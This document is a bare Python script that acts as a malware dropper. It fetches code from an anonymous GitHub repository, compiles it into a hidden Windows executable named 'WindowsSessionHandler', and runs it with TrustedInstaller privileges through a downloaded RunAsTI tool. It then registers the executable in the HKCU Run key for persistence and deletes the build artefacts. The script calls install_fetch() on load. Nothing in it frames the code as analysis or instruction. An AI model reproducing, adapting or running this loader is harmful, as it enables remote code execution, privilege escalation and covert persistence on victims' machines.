import urllib.request
import os
import subprocess
import random
import shutil
from pathlib import Path

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A372 Safari/604.1",
]

TEMP_DIR = Path(os.getenv('TEMP'))
DIST_DIR = TEMP_DIR / "dist"
BUILD_DIR = TEMP_DIR / "build"

def fetch_python_code(url):
    user_agent = random.choice(user_agents)
    headers = {'User-Agent': user_agent}
    req = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(req) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error fetching URL {url}: {e}")
        return None

def write_python_file(code, filename):
    if code:
        py_file_path = TEMP_DIR / filename
        try:
            with py_file_path.open('w', encoding='utf-8') as f:
                f.write(code)
            return py_file_path
        except Exception as e:
            print(f"Error writing file {filename}: {e}")
    return None

def compile_python_to_exe(py_file_path, exe_name):
    if not py_file_path:
        return None

    try:
        DIST_DIR.mkdir(exist_ok=True)
        BUILD_DIR.mkdir(exist_ok=True)
        
        subprocess.run([
            'pyinstaller',
            '--onefile',
            '--noconsole',
            f'--name={exe_name}',
            f'--distpath={DIST_DIR}',
            f'--workpath={BUILD_DIR}',
            str(py_file_path)
        ], check=True)

        exe_file_path = DIST_DIR / (exe_name + ".exe")
        return exe_file_path if exe_file_path.exists() else None
    except subprocess.CalledProcessError as e:
        print(f"Error during compilation: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")
    return None

def download_file(url, dest_path):
    try:
        urllib.request.urlretrieve(url, dest_path)
        return dest_path if dest_path.exists() else None
    except Exception as e:
        print(f"Error downloading {url}: {e}")
        return None

def execute_with_ti(run_as_ti_path, exe_path):
    if run_as_ti_path and exe_path:
        try:
            subprocess.run([str(run_as_ti_path), str(exe_path)], check=True)
        except Exception as e:
            print(f"Error executing with RunAsTI: {e}")

def add_to_startup(exe_path):
    if not exe_path or not exe_path.exists():
        return

    startup_path = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    exe_name = exe_path.name
    reg_query = f'reg query "{startup_path}" /f "{exe_name}"'

    try:
        result = subprocess.run(reg_query, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        if result.returncode != 0:  # If not already in startup
            reg_add = f'reg add "{startup_path}" /v "{exe_name}" /t REG_SZ /d "{exe_path}" /f'
            subprocess.run(reg_add, shell=True)
    except Exception as e:
        print(f"Error adding to startup: {e}")

def clean_up(py_file_path):
    try:
        if py_file_path.exists():
            py_file_path.unlink()
        if BUILD_DIR.exists():
            shutil.rmtree(BUILD_DIR)
        if DIST_DIR.exists():
            shutil.rmtree(DIST_DIR)
    except Exception as e:
        print(f"Error during cleanup: {e}")

def install_fetch():
    fetch_url = "https://github.com/247msn/96737693845/raw/refs/heads/main/fetch"
    run_as_ti_url = "https://github.com/jschicht/RunAsTI/raw/refs/heads/master/RunAsTI64.exe"

    # Fetch and write Python file
    code = fetch_python_code(fetch_url)
    py_file_path = write_python_file(code, "WindowsSessionHandler.py") if code else None

    # Compile Python file to EXE
    exe_file_path = compile_python_to_exe(py_file_path, "WindowsSessionHandler") if py_file_path else None

    # Download RunAsTI utility
    run_as_ti_path = download_file(run_as_ti_url, TEMP_DIR / "RunAsTI64.exe")

    # Execute EXE with RunAsTI and add to startup
    if exe_file_path and run_as_ti_path:
        execute_with_ti(run_as_ti_path, exe_file_path)
        add_to_startup(exe_file_path)

    # Cleanup temporary files
    clean_up(py_file_path)

install_fetch()
